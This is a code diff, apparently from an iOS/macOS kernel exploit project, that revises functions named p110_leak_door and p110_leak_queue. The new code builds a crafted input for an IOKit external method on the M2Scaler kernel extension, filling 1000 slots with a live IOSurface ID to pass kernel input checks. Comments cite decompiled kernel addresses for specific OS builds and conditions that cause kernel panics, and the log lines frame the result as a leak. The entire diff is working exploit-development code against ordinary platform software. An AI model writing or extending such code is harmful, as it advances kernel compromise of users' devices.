@@ -100,7 +100,7 @@
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2.4-openretry"
+#define P110_BUILD      @"p110-swapclaim-v2.5-contractv5"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -497,38 +497,42 @@ static BOOL p110_leak_door(void) {
     return (kr == KERN_SUCCESS && g_p110_m2conn);
 }
 
-/* queue create (sel 6) — p098 v5 law: sel-8 with no queue on the connection
-   reads zero bytes and rejects. v2.2 laws (byte-verified on-disk on BOTH
-   builds, 2026-10-27): (1) sel-6 in-size = 0xFA8 (M2Scaler dispatch table,
-   24A435 @0xfffffe00080efcd8; LabOff queue_create_size row = IOGPU, not
-   M2Scaler); (2) the sel-6 builder's tail gate requires in[0xFA4] bit0 = 1
-   (23F77 tail 0x8a64490, 24A435 tail 0x90dcd28) — the 22:13 17-side device
-   run proved the bit law exactly (zeros -> 2c2, outLen=4008 echoed). */
+/* queue create (sel 6) — v2.5 CONTRACT v5 (the grammar agent's full decode,
+   Ghidra-corroborated, 2026-10-28): in = {u32 0x3e8 (=1000); u32 sids[1000];
+   u32 flags}; tags = REAL LIVE IOSurface SIDs owned by the calling task
+   (factory = the IOSurface root SID lookup, IOCoreSurfaceRoot; every one of
+   the 1000 slots must resolve; a MISMATCHED/foreign sid = the
+   "IOSurface in slot…mismatched…ID" PANIC class — the tag surfaces stay
+   ALIVE through the call); in[0xFA4] bit0 = 1 (note 274). The v2.3
+   count=2 reading was wrong (phase0 bounds word0 > 0x3e7 + front gate
+   <= 0x3e8 → exactly 1000). */
 static void p110_leak_queue(void) {
     if (g_p110_m2queued || !g_p110_m2conn) return;
     g_p110_m2queued = YES;
     uint32_t qsz = 0xFA8u;
     static uint8_t qBuf[0xFA8];
     memset(qBuf, 0, sizeof(qBuf));
-    qBuf[0xFA4] = 0x01;
-    /* v2.3 PHASE LAW (byte-verified 24A435 0x909b2e8-family, 2026-10-27):
-       the 4-phase builder's phases 1..3 require in[0] > 1 (else 2bd+5=2c2)
-       and each passes (count=2, in+4) to the shared factory (0x908f9d4)
-       which instantiates TWO objects per phase via the IOSurface-kext
-       create stub (GOT 0x81153e0 -> 0xa344130). Phase 0 (0x908f5ec) reads
-       in[0] itself (0x908f664) and walks u32 tags post-increment
-       (0x908f6cc). So in[0] = the object count, legal window (front gate
-       <= 0x3e8 AND phases > 1) -> 2; tags at in[4]/in[8] = the factory
-       params (tagn 0 = the first probe value). */
-    *(uint32_t *)(void *)qBuf = 0x2;          /* word0 = count 2        */
-    *(uint32_t *)(void *)(qBuf + 4) = 0x0;    /* tag1 (factory param)   */
-    *(uint32_t *)(void *)(qBuf + 8) = 0x0;    /* tag2 (factory param)   */
+    uint32_t qs_sid = 0;
+    IOSurfaceRef qs = p110_create(&qs_sid);   /* the one owned tag surface
+      (ALIVE through the call; the mismatched-sid PANIC law) */
+    if (!qs || !qs_sid) {
+        Lf(@"[leak] QueueCreate HOLD (no-guess law): no owned sid (Create/GetID) "
+           @"- the v5 tags contract cannot be built; honest stop, no call sent.");
+        if (qs) p110_release(qs);
+        return;
+    }
+    *(uint32_t *)(void *)qBuf = 0x3e8;                    /* word0 = 1000  */
+    for (int ti = 0; ti < 1000; ti++)
+        *(uint32_t *)(void *)(qBuf + 4 + ti * 4) = qs_sid; /* tags[i]       */
+    qBuf[0xFA4] = 0x01;                                   /* flag bit0     */
+    Lf(@"[leak] v5 contract: word0=0x3e8 (1000 tags of sid=0x%08x) + in[0xFA4]=1",
+       qs_sid);
     size_t qOutLen = sizeof(qBuf);
     uint64_t qOut[4] = {0};
     kern_return_t krQ = g_p110_callStruct(g_p110_m2conn, 6, qBuf, qsz, qOut, &qOutLen);
     g_p110_m2qh = qOut[0];
-    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (0xfa8 row law + content law "
-       @"in[0xFA4] bit0=1) "
+    if (qs) p110_release(qs);               /* the kext holds its own refs */
+    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (v5 contract: {1000, sids[1000], flags}) "
        @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
        qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
 }
